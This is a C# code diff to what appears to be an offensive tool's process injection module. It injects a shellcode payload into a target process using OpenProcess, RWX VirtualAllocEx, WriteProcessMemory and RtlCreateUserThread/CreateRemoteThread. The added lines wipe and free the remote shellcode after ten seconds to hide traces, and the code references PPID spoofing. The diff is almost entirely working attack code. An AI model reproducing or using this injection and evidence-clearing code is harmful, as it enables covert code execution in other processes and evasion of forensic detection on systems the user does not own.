@@ -2,6 +2,7 @@
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Text;
+using System.Threading;
 
 namespace Core.Injection
 {
@@ -322,14 +323,16 @@ namespace Core.Injection
             IntPtr dwSize;
             Console.WriteLine(" > [+] Injecting into PID: " + pid32.ToString());
             IntPtr hProcess = Inject.OpenProcess(Inject.PROCESS_ALL_ACCESS, false, (uint)pid32);
-            Console.WriteLine(" > [+] OpenProcess hProcess: " + hProcess.ToString());
-            IntPtr hBaseAddress = Inject.VirtualAllocEx(hProcess, IntPtr.Zero, new IntPtr((uint)payload32.Length * 2), 0x3000, 0x40);
+
+            Console.WriteLine(" > [+] OpenProcess hProcess:  0x" + string.Format("{0:X8}", hProcess.ToInt64()));
+            IntPtr hBaseAddress = Inject.VirtualAllocEx(hProcess, IntPtr.Zero, new IntPtr((uint)payload32.Length * 2), 0x3000, PPIDSpoofer.PAGE_EXECUTE_READWRITE);
             if (hBaseAddress == null)
             {
-                Console.WriteLine(" > [+] VirtualAllocEx: True");
-            } else
+                Console.WriteLine(" > [-] VirtualAllocEx RWX: Failed");
+            }
+            else
             {
-                Console.WriteLine(" > [+] VirtualAllocEx: " + hBaseAddress.ToString());
+                Console.WriteLine(" > [+] VirtualAllocEx RWX: 0x" + string.Format("{0:X8}", hBaseAddress.ToInt64()));
             }
             bool success = Inject.WriteProcessMemory(hProcess, hBaseAddress, payload32, payload32.Length, out dwSize);
             if (success)
@@ -337,7 +340,7 @@ namespace Core.Injection
                 Console.WriteLine(" > [+] WriteProcessMemory: " + success.ToString());
                 IntPtr tHandle = IntPtr.Zero;
                 int hintThread = Inject.RtlCreateUserThread(hProcess, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, hBaseAddress, IntPtr.Zero, ref tHandle, IntPtr.Zero);
-                Console.WriteLine(" > [+] Injected using RtlCreateUserThread: " + hintThread.ToString());
+
                 if (hintThread != 0)
                 {
                     IntPtr hptrThread = Inject.CreateRemoteThread(hProcess, IntPtr.Zero, 0, hBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);
@@ -347,14 +350,51 @@ namespace Core.Injection
                         Console.WriteLine(" > [-] CreateRemoteThread Failed - Failing over to CreateRemoteThread64: " + hptrThread.ToString());
                         IntPtr hptreThread = Util.CreateRemoteThread64((uint)hProcess.ToInt32(), (uint)hBaseAddress.ToInt32(), 0);
                     }
+                    bool HandlehptrThread = Inject.CloseHandle(hptrThread);
+                    Console.WriteLine(" > [+] CloseHandle to Inject Thread: " + HandlehptrThread.ToString());
                 }
-            } else
+                else
+                {
+                    Console.WriteLine(" > [+] RtlCreateUserThread Injection: " + tHandle.ToString());
+                    bool HandletHandle = Inject.CloseHandle(tHandle);
+                    Console.WriteLine(" > [+] CloseHandle to Inject Thread: " + HandletHandle.ToString());
+                }
+
+            }
+            else
             {
                 Console.WriteLine(" > [-] WriteProcessMemory: " + success.ToString());
             }
-            
-            //else to 32 -> 64 bit migration
-            Console.WriteLine(" > LastError: " + Marshal.GetLastWin32Error());
+
+            // wait for execution to start in the remote process then clear the shellcode stub in the remote process
+            Thread.Sleep(10000);
+            var overwriteData = new byte[payload32.Length];
+            for (int i = 0; i < overwriteData.Length; i++)
+            {
+                overwriteData[i] = 0x00;
+            }
+            bool overwriteSuccess = Inject.WriteProcessMemory(hProcess, hBaseAddress, overwriteData, overwriteData.Length, out dwSize);
+            if (overwriteSuccess)
+            {
+                Console.WriteLine(" > [-] Overwritten Memory Allocation with 0x00's: True");
+            }
+            bool VFree = Inject.VirtualFreeEx(hProcess, hBaseAddress, 0, Inject.FreeType.Release);
+            if (!VFree)
+            {
+                Console.WriteLine(" > [-] VirtualFreeEx after 10 seconds: Failed");
+            }
+            else
+            {
+                Console.WriteLine(" > [+] VirtualFreeEx after 10 seconds: True");
+            }
+
+            bool HandlehProcess = Inject.CloseHandle(hProcess);
+            Console.WriteLine(" > [+] Close handle Process: " + HandlehProcess.ToString());
+
+            if (Marshal.GetLastWin32Error() != 0)
+            {
+                Console.WriteLine(" > LastError: " + Marshal.GetLastWin32Error());
+            }
 
         }
 
@@ -629,6 +669,16 @@ namespace Core.Injection
         [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)] public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);
         // RtlCreateUserThread
         [DllImport("ntdll.dll")] public static extern int RtlCreateUserThread(IntPtr Process, IntPtr ThreadSecurityDescriptor, Boolean CreateSuspended, IntPtr ZeroBits, IntPtr MaximumStackSize, IntPtr CommittedStackSize, IntPtr StartAddress, IntPtr Parameter, ref IntPtr Thread, IntPtr ClientId);
+
+        [Flags]
+        public enum FreeType
+        {
+            Decommit = 0x4000,
+            Release = 0x8000,
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool CreateProcess(string lpApplicationName,
